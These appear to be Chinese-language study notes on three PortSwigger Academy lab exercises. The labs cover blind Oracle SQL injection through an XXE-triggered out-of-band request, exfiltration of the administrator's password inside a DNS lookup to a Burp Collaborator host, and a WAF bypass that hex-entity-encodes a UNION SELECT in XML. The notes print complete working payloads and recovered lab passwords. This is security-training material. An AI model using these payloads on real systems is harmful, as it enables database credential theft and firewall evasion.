成功获得管理员密码`81gqybikcfqaidespeos`

# Lab: Blind SQL injection with out-of-band interaction

在Oracle数据库中，通过`UNION SELECT`注入执行带外（OOB）请求。利用`XMLType`函数解析恶意XML文档，触发外部实体（XXE）向攻击者控制的服务器（Burp Collaborator）发起DNS/HTTP请求，从而验证盲注漏洞的存在。该方法不依赖页面回显或报错信息，而是通过外部交互确认注入点。

- **注入点**：Cookie中的`TrackingId`参数，通过`UNION SELECT`注入（非`||`拼接）。
    
- **数据库类型**：Oracle（使用`xmltype`、`EXTRACTVALUE`、`dual`虚拟表）。
    
- **核心函数**：
    
    - `xmltype()`：将字符串解析为XML文档。
        
    - `EXTRACTVALUE()`：从XML中提取值，但在此Payload中仅用于触发XXE解析。
        
    - 外部实体`%remote`指向Collaborator地址，强制数据库发起DNS查询。
        
- **Payload特点**：
    
    - 使用`UNION SELECT`而非`||`拼接，利用`x'`（不存在值）使第一个查询返回空，第二个查询（恶意XML）被执行。
        
    - 不需要列数对齐（`UNION`要求列数一致，但`x'`返回空，列数匹配任一单一列即可）。
        
- **判断依据**：Burp Collaborator收到DNS/HTTP请求即为成功。

```
GET /filter?category=Pets HTTP/2
Host: 0a21004804cc734c809e17400064008a.web-security-academy.net
Cookie: TrackingId=jaC2iLFULLLSJqbS'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//ibxm4xexdygyup87k3bimbygi7oycp0e.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--+; session=MUTbkBZ6WQRgaofFVPtVtAcnfRkOfPLa
```

# Lab: Blind SQL injection with out-of-band data exfiltration

在Oracle数据库中，通过`UNION SELECT`注入执行带外（OOB）数据外泄。利用`XMLType`函数解析恶意XML文档，触发外部实体（XXE）向攻击者控制的服务器（Burp Collaborator）发起DNS/HTTP请求，并将查询到的敏感数据（如密码）拼接到子域名中，从而实现数据的外泄传输。该方法不依赖页面回显或报错信息，通过外部交互直接获取数据。

- **注入点**：Cookie中的`TrackingId`参数，通过`UNION SELECT`注入。
    
- **数据库类型**：Oracle（使用`xmltype`、`EXTRACTVALUE`、`dual`虚拟表）。
    
- **核心函数**：
    
    - `xmltype()`：将字符串解析为XML文档。
        
    - `EXTRACTVALUE()`：从XML中提取值，在此Payload中用于触发XXE解析。
        
    - 外部实体`%remote`指向Collaborator地址，并将子查询结果（密码）拼接到域名中。
        
- **数据外泄机制**：`'||(SELECT password FROM users WHERE username='administrator')||'.oastify.com`将密码拼接到Collaborator子域名的前面，DNS解析时会携带该密码，攻击者从DNS日志中提取。
    
- **与上一个实验的区别**：上一个实验仅验证漏洞存在（固定域名），本实验将查询到的数据（密码）通过域名拼接外泄，实现数据提取。
    
- **URL编码注意事项**：
    
    - `%3f` = `?`
        
    - `%3d` = `=`
        
    - `%25` = `%`（用于实体`%remote`）
        
    - `%3a` = `:`
        
- **判断依据**：Burp Collaborator收到包含密码的DNS请求，如`密码.xxx.oastify.com`。

```
GET /filter?category=Gifts HTTP/2
Host: 0a3b00d204355d55800c4459006500d0.web-security-academy.net
Cookie: TrackingId=WKNfuO16SQhSpbIA'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.syuwr7170838hzvh7dys9llq5hb8z0np.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; session=xhX57SgPxidVMVukTn8scKFE4v0DaAQj
```

# Lab: SQL injection with filter bypass via XML encoding

应用程序使用XML格式传递参数（如`productId`和`storeId`），后端将其解析后拼接到SQL查询中。WAF（Web应用防火墙）检测到`union select`等关键字时拦截请求。通过利用XML编码机制（如十六进制实体编码`&#x...;`），将SQL关键字编码后放入XML标签内，后端解析XML时自动解码还原为原始SQL语句，从而绕过WAF检测，实现注入攻击。本实验在`storeId`字段中注入`3 union select username || ':' || password from users`，成功提取所有用户的凭证。

- **注入点**：XML中的`productId`或`storeId`字段，后端将其值拼接到SQL语句中。
    
- **WAF绕过技术**：
    
    - XML解析器自动解码十六进制实体（`&#x...;`）或HTML实体（`&...;`）。
        
    - 将关键字（如`union`、`select`、`from`）转换为十六进制编码，WAF看到的是编码后的普通文本，不会触发规则。
        
    - 后端接收XML并解析时，解码还原为原始SQL，注入成功。
        
- **编码示例**：
    
    - `u` → `&#x75;`
        
    - `n` → `&#x6e;`
        
    - `i` → `&#x69;`
        
    - `o` → `&#x6f;`
        
    - `n` → `&#x6e;`
        
    - 完整编码：`3 &#x75;&#x6e;&#x69;&#x6f;&#x6e; select ...`
        
- **拼接技巧**：由于WAF会拦截`||`（管道符），需对其也进行编码（`&#x7c;&#x7c;`），或使用`concat()`函数（`concat(username, ':', password)`）。
    
- **审计思路**：XML注入中，若某个字段被WAF拦截，可尝试对该字段的值进行全实体编码（十六进制或HTML实体），解码后绕过检测。

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>3+1</productId><storeId>1+2</storeId></stockCheck>

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>3 union select null</productId><storeId>1</storeId></stockCheck>

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>3</productId><storeId>1 union select null</storeId></stockCheck>

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>3</productId><storeId><@hex_entities>3 union select username || ':' || password from users</@hex_entities></storeId></stockCheck>
```

成功获得管理员密码`7mv7r23to1qs44f767np`